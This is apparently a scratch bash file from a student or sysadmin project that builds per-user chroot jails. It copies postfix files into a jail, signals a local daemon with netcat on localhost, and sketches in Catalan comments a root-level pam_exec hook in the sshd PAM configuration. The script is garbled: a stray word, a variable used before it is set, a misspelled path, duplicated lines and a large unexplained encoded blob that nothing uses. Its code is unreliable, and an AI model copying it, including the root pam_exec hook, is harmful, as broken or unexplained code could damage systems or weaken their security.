#!/bin/bash

user="$(whoami)"

systemctl start dimoniRoot



merdaa

cp /usr/sbin/sendmail $JAIL/usr/sbin
    cp /usr/lib/sendmail $JAIL/usr/lib
    mkdir $JAIL/usr/lib/postfix
    cp -r /usr/lib/postfix/* $JAIL/usr/lib/postfix
    cp -r /usr/lib/x86_64-linux-gnu/* $JAIL/usr/lib/x86_64-linux-gnu
    mkdir $JAIL/etc/postfix
    cp -r /etc/postfix/* $JAIL/etc/postfix
    mkdir -p $JAIL/var/spool/postfix
    cp -r /var/spool/postfix/* $JAIL/var/spool/postix
    cp -r /usr/sbin/postdrop $JAIL/usr/sbin
    chown postfix:postdrop /var/spool/postfix/maildrop 
    chmod 730 /var/spool/postfix/maildrop





ErtIuFa4sROdOMVp8iWvgXC5mq6WFdbh+AZaqZodv+NgQcAEAjl7Vhl/w4E5c9Vq9DTnu3GIvnXvN1ADgiotB1YRMfktB5J/NM2f6qt+wZDg+bwhRauRjJxv5wUBVq4poJYVu5ybSyy0nKcK2jFxrB8cwOAzXx/bvbJ4HK/yYjKbNn7wnbWDV9w9BfCbRzxhEkquxmPTz7ZVrTBJAVd2eQ6Bg11XLMI41QNuYph3PS+2NEOF6ZgvdVXu1RwOnuGLazqR80ElxyZNB7InVYDDIDDJVcbMQJi+fv+UQ8V2WzSTQFKxAmKTeJifIFZAWrfxGdLH6Qly1LzlX2ZlcKCEFL/PaqBuADT6tJMKSjcmxpzLzWLTHrtK03b/EUf7Ay7tBWHKCkaMLRoWnFqy6oekOf7TVgsutsrxyQg42d6gnylynAjzV80HsSkLGA71Rd5BTXpwbLeRn19IHfJ2uRwNv/7d4+Svv4PebRZgzbY7KWsYG8TBDpHFCFw7/FzZ2rZ5wUKOcFcgl8HcqPGQb1WApX2fOdo5o1S6OY0agCsSBsVKcS+tScb8Nu8hsFt0ab6HEcuKmAL0y4RmSKZXZ/Zapqj1B3kdE0xuOF0Au4NW+4M4d2GEdqZRat0bs6Ig2QzMWzHVglNSovsBCE2CvaHKFmqr7ptlE6aUOAD1prXor5I6L2Im0uIFaJq/Bxn4R57vADw/3j2h3TZQorxqBejGetR5TYDlZsCjqVndNm8MZ/9aNusvFbii/e4UD1J9gJ+85y1GIqEPRVyWciSZaTS9C+6DP1qi2kc87zaZQ2S7oBu6LdpVbMFFbA8Trwkth2zen9mdd5Xnseqm7WL6/wSv5IthucSOOblrnMEk3a3PfJFqc0YD8miJcC62+D8NflIuWoU86jGeyphTarwubSTW+N2BaC88qNvi2w3lY1PJsZu7If8WLDddJ3zM0UEA69fvo3RysU9VQBuLrArxx6I/u7Mhc6S8U3FdlAr/ZNWCyazqVOJ8TjwSRqQGCHSvq2gII3JjIzTD3lEJhguImVG64Zb8A28VyJLamtneOJlQHGDf551MKgDk9NKthriq8zIJlCM2Qv0nYIJ4qoA7E4JLc+drwMI0sG6dXT/1AALamfeTJVPYtuyu3TqzOnHHMmuSIgjbAc3xla+oSY96EorRng2He1QaRtMTKcTWaISuL+g0mAEKlKCQ+9TartJFT6aFISHpTnTq4ZmLfUvAg5RTUNPwnAvdkQc3T1adNVnGdP0d2RdFPxSNPjeL9iZc86F41bzrDsnCOXd19ixaPNwx/0gvE/PRxBStccw0GTUgW7XCBP/Ee2NyVo2luxQLufm5NwF5WV46iZu9CCQcmxoe+tXAaxadoeLa240HOSm6j21czbVeMWUYu60+Ej2QQEYM+ejCmz2a6oudnjHCmV+IXCGpzy+2GWC2Kh8FAGC5jSJkqbl8hUsfClLgj92txZW/PLyL/dAYT+E5rTujrj/RDRbKUFcUouG0IKmhc/mLGwEOb4dqX3nMdTEEqfdYN7kpeA/OAFyA+N246eoLEWa8amWqRLoHDuRXzKTAmFWezpeoOswjer9YYjg+ZHnoulI5




echo "provnadoodmoamdso" > message.txt
admin=$(cat /users/configuracio | tail -n1)

    chmod 755 /users/visitor/visitor2/home/visitor2/*

echo "visitor2-crea" | netcat localhost 4444 -w0




JAIL=/users/$rol/$user


echo "visitor2-crea" |netcat localhost 4444 -w0




#fer servir pam per execurtar amb root i varibales de entor

#amb el bash logut simplement cal matar el proces de bin bash de lusuari

#/etc/pam.d/sshd posar session optional pam_exec.so /bin/bash /users/config/enviroment $PAM-USER
mirar les variables que te pam. Enviroment a dins haura de mirar ell sol quin es el seu rol etc..
IMPORTA LA POSICIO

auth [default=ignore] pam_exec.so bash /users/config/enviroment $PAM_USER
